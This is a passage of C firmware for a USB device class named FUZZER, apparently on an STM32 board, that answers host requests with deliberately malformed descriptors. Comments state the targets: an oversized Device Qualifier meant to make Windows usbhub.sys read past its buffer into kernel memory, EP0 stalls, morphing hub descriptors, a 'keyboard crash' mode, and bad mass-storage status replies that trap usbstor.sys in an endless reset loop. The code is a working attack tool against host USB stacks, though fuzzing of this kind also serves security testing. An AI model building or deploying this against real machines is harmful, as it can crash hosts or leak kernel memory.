            break;
        case 0x06: /* GET_DESCRIPTOR (class) — hub class descriptor 0x29 */
            if ((req->wValue >> 8) == 0x29U) {
                len  = MIN((uint16_t)sizeof(FUZZER_HubDesc), req->wLength);
                pbuf = FUZZER_HubDesc;
                USBD_CtlSendData(pdev, (uint8_t *)pbuf, len);
            } else {
                USBD_CtlError(pdev, req);
                return USBD_FAIL;
            }
            break;
        default:
            USBD_CtlError(pdev, req);
            return USBD_FAIL;
        }
        break;

    case USB_REQ_TYPE_STANDARD:
        switch (req->bRequest) {
        case USB_REQ_GET_DESCRIPTOR:
            /* Mode 24: MS OS String Descriptor at index 0xEE */
            if ((req->wValue >> 8) == 0x03U && (req->wValue & 0xFFU) == 0xEEU &&
                g_active_fuzz_mode == FUZZ_MODE_MS_OS_DESC) {
                len  = MIN((uint16_t)sizeof(FUZZER_OsStringDesc), req->wLength);
                pbuf = FUZZER_OsStringDesc;
                USBD_CtlSendData(pdev, (uint8_t *)pbuf, len);
                break;
            }
            if ((req->wValue >> 8) == 0x22U) { /* HID Report descriptor */
                if (g_active_fuzz_mode == FUZZ_MODE_KBD_CRASH) {
                    len  = MIN(FUZZER_KBD_REPORT_DESC_SIZE, req->wLength);
                    pbuf = FUZZER_KbdReportDesc;
                } else if (g_active_fuzz_mode == FUZZ_MODE_HID_REPORT_FUZZ   ||
                           g_active_fuzz_mode == FUZZ_MODE_RECONNECT_LOOP     ||
                           (g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE &&
                            g_auto_seq_mode   == FUZZ_MODE_HID_REPORT_FUZZ)) {
                    len  = MIN((uint16_t)sizeof(FUZZER_ReportDesc_Fuzz), req->wLength);
                    pbuf = FUZZER_ReportDesc_Fuzz;
                } else {
                    len  = MIN(FUZZER_HID_REPORT_DESC_SIZE, req->wLength);
                    pbuf = FUZZER_ReportDesc;
                }
                USBD_CtlSendData(pdev, (uint8_t *)pbuf, len);
            } else if ((req->wValue >> 8) == 0x21U) { /* HID descriptor */
                len = MIN(9U, req->wLength);
                pbuf = &FUZZER_CfgDesc[18];
                USBD_CtlSendData(pdev, (uint8_t *)pbuf, len);
            } else if ((req->wValue >> 8) == 0x0FU) { /* BOS descriptor (USB 3.0) */
                len  = MIN((uint16_t)sizeof(FUZZER_BosDesc), req->wLength);
                pbuf = FUZZER_BosDesc;
                USBD_CtlSendData(pdev, (uint8_t *)pbuf, len);
            } else {
                USBD_CtlError(pdev, req);
                return USBD_FAIL;
            }
            break;

        case USB_REQ_GET_INTERFACE:
            if (pdev->dev_state == USBD_STATE_CONFIGURED) {
                uint8_t alt = 0;
                USBD_CtlSendData(pdev, &alt, 1U);
            } else {
                USBD_CtlError(pdev, req);
                return USBD_FAIL;
            }
            break;

        case USB_REQ_SET_INTERFACE:
            break;

        default:
            USBD_CtlError(pdev, req);
            return USBD_FAIL;
        }
        break;

    default:
        USBD_CtlError(pdev, req);
        return USBD_FAIL;
    }
    return USBD_OK;
}

static uint8_t *USBD_FUZZER_GetFSCfgDesc(uint16_t *length)
{
    ApplyFuzzPatches();

    /* Mode 23: arm EP0 status-phase stall on next TxSent */
    if (g_active_fuzz_mode == FUZZ_MODE_EP0_STALL_MID) {
        g_ep0_stall_armed = 1;
        *length = sizeof(FUZZER_LargeDesc);
        return FUZZER_LargeDesc;
    }

    /* Mode 25: morph — serve different class each phase */
    if (g_active_fuzz_mode == FUZZ_MODE_DESC_MORPH) {
        if (g_morph_phase == 1U) {
            /* Phase 1: Hub class config */
            FUZZER_CfgDesc[14] = 0x09; /* bInterfaceClass=Hub */
            FUZZER_CfgDesc[4]  = 0x01;
        } else if (g_morph_phase == 2U) {
            /* Phase 2: garbage — all mutable fields randomised */
            Fuzzer_RandomPatch(FUZZER_CfgDesc, FUZZER_CFG_DESC_SIZE);
        }
    }

    /* Mode 26: IAD conflict composite */
    if (g_active_fuzz_mode == FUZZ_MODE_IAD_CONFLICT) {
        *length = FUZZER_IAD_CFG_DESC_SIZE;
        return FUZZER_IadCfgDesc;
    }

    /* Mode 27: MSC BOT */
    if (g_active_fuzz_mode == FUZZ_MODE_MSC_SCSI_BOMB) {
        *length = FUZZER_MSC_CFG_DESC_SIZE;
        return FUZZER_MscCfgDesc;
    }

    *length = FUZZER_CFG_DESC_SIZE;
    return FUZZER_CfgDesc;
}

/* Mode 21: Device Qualifier with bLength=0xFF + bcdUSB=3.00 + bDeviceClass=Hub.
 * Windows requests this when bcdUSB≥0x0200 on a full-speed device.
 * bLength=255 → usbhub.sys/usbport.sys reads 245 bytes past the 10-byte struct. */
static const uint8_t FUZZER_DevQualDesc[] = {
    0xFF,       /* bLength=255 (real=10) — OOB read into kernel pool */
    0x06,       /* bDescriptorType=Device_Qualifier */
    0x00, 0x03, /* bcdUSB=3.00 */
    0x09,       /* bDeviceClass=Hub */
    0x00,       /* bDeviceSubClass */
    0x00,       /* bDeviceProtocol */
    0xFF,       /* bMaxPacketSize0=255 */
    0xFE,       /* bNumConfigurations=254 */
    0x00,       /* bReserved */
};

static uint8_t *USBD_FUZZER_GetDeviceQualifierDesc(uint16_t *length)
{
    uint8_t eff = (g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE ||
                   g_active_fuzz_mode == FUZZ_MODE_BOOT_DISRUPT)
                  ? g_auto_seq_mode : g_active_fuzz_mode;
    if (eff == FUZZ_MODE_DEVQUAL_BOMB) {
        *length = (uint16_t)sizeof(FUZZER_DevQualDesc);
        return (uint8_t *)FUZZER_DevQualDesc;
    }
    *length = 0;
    return NULL;
}

/* Mode 23 / Mode 30: stall EP0 IN at the status phase.
 * EP0_TxSent fires after all descriptor data has been sent by the device.
 * Stalling here aborts the status handshake — the host marks the control
 * transfer as failed and either retries or resets the device. */
static uint8_t USBD_FUZZER_EP0_TxSent(USBD_HandleTypeDef *pdev)
{
    if (g_ep0_stall_armed) {
        g_ep0_stall_armed = 0;
        HAL_PCD_EP_SetStall(pdev->pData, 0x80U);
    }
    return USBD_OK;
}

static uint8_t USBD_FUZZER_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
    (void)pdev;
    (void)epnum;
    return USBD_OK;
}

/* Mode 27: MSC DataOut — any received CBW triggers a malformed CSW.
 * dCSWSignature=0xBAADC0DE (spec requires 0x53425355 "USBS").
 * bCSWStatus=0x05 (Phase Error) → usbstor.sys issues a BOT Reset.
 * After reset it sends another CBW → another malformed CSW → infinite loop. */
static uint8_t USBD_FUZZER_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
    if (epnum == (FUZZER_EPOUT_ADDR & 0x0FU)) {
        /* Extract CBW tag for the CSW (dCSWTag must mirror dCBWTag) */
        uint32_t tag = 0;
        if (USBD_LL_GetRxDataSize(pdev, epnum) >= 8U) {
            tag = (uint32_t)g_cbw_buf[4] | ((uint32_t)g_cbw_buf[5] << 8) |
                  ((uint32_t)g_cbw_buf[6] << 16) | ((uint32_t)g_cbw_buf[7] << 24);
        }
        static uint8_t csw[13];
        csw[0] = 0xDE; csw[1] = 0xC0; csw[2] = 0xAD; csw[3] = 0xBA; /* bad sig */
        csw[4] = (uint8_t)(tag);        csw[5] = (uint8_t)(tag >> 8);
        csw[6] = (uint8_t)(tag >> 16);  csw[7] = (uint8_t)(tag >> 24);
        csw[8] = 0xFF; csw[9] = 0xFF; csw[10] = 0xFF; csw[11] = 0xFF; /* residue */
        csw[12] = 0x05; /* Phase Error */
        USBD_LL_Transmit(pdev, FUZZER_EPIN_ADDR, csw, 13U);
        USBD_LL_PrepareReceive(pdev, FUZZER_EPOUT_ADDR, g_cbw_buf, FUZZER_BULK_SIZE);
    }
    return USBD_OK;
}

/* Send 8-byte HID report via interrupt IN endpoint.
 * Used by Mode 17 (keyboard crash) in main.c. */
void USBD_FUZZER_Transmit(USBD_HandleTypeDef *pdev, uint8_t *buf, uint16_t len)
{
    USBD_LL_Transmit(pdev, FUZZER_EPIN_ADDR, buf, len);
}

USBD_ClassTypeDef USBD_FUZZER = {
    .Init                          = USBD_FUZZER_Init,
    .DeInit                        = USBD_FUZZER_DeInit,
    .Setup                         = USBD_FUZZER_Setup,
    .EP0_TxSent                    = USBD_FUZZER_EP0_TxSent,
    .EP0_RxReady                   = NULL,
    .DataIn                        = USBD_FUZZER_DataIn,
    .DataOut                       = USBD_FUZZER_DataOut,
    .SOF                           = NULL,
    .IsoINIncomplete               = NULL,
    .IsoOUTIncomplete              = NULL,
    .GetFSConfigDescriptor         = USBD_FUZZER_GetFSCfgDesc,
    .GetHSConfigDescriptor         = USBD_FUZZER_GetFSCfgDesc,
    .GetOtherSpeedConfigDescriptor = USBD_FUZZER_GetFSCfgDesc,
    .GetDeviceQualifierDescriptor  = USBD_FUZZER_GetDeviceQualifierDesc,
};
